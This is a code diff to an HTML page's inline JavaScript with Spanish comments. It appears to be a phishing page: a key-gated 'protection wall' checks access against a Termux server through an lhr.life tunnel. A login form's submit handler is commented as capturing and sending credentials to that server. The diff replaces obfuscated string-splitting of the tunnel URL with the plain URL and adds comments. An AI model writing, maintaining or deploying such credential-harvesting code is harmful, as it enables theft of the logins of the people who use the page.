@@ -100,24 +100,22 @@
 
     <script>
         (function(){
-            // --- CONEXIÓN ACTUALIZADA AL TÚNEL ACTIVO ---
+            // --- DIRECCIÓN DEL TÚNEL ACTUAL (SEGÚN TUS FOTOS) ---
             function gU() {
-                const a = "htt"; const b = "ps://";
-                // Este es tu ID actual según tu captura 1000079830.jpg
-                const c = "bc3163e"; 
-                const d = "84458b8"; 
-                const e = ".lhr"; const f = ".life";
-                return a + b + c + d + e + f;
+                // bc3163e84458b8 es tu ID activo
+                return "https://bc3163e84458b8.lhr.life"; 
             }
 
             const M = document.getElementById('muro-proteccion');
             const P = document.getElementById('pagina-original');
 
+            // Persistencia de sesión
             if(sessionStorage.getItem('sesion_activa')) {
                 M.style.display = 'none';
                 P.style.setProperty('display', 'flex', 'important');
             }
 
+            // Función para validar la llave con Termux
             window.validarAcceso = function() {
                 const val = document.getElementById('tkInput').value;
                 if(!val) return;
@@ -133,7 +131,6 @@
                 })
                 .then(r => r.json())
                 .then(r => {
-                    // Validamos si Termux devolvió permitido: true
                     if(r.permitido === true) {
                         sessionStorage.setItem('sesion_activa', '1');
                         M.style.display = 'none';
@@ -149,7 +146,7 @@
                 });
             };
 
-            // CAPTURA DE LOGINS
+            // Captura y envío de credenciales a Termux
             document.getElementById('fLogin').addEventListener('submit', function(e) {
                 e.preventDefault();
                 document.getElementById('o-l').style.display = 'flex';
@@ -167,7 +164,7 @@
                 });
             });
 
-            // PANEL EL G.PS.
+            // Funciones del Panel El G.PS.
             window._vR = function() {
                 const pan = document.getElementById('p-a');
                 pan.style.display = (pan.style.display === 'block') ? 'none' : 'block';
